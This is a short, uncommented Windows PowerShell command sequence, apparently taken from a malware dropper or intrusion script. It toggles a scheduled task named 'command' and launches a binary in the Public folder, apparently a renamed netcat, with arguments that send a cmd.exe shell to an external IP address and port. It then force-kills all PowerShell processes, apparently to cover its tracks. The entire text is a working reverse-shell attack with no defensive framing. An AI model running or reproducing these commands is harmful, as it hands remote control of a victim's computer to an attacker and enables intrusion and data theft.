Stop-ScheduledTask -TaskName command
Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 61030 -e cmd.exe"
Start-ScheduledTask -TaskName command
taskkill /F /IM powershell.exe
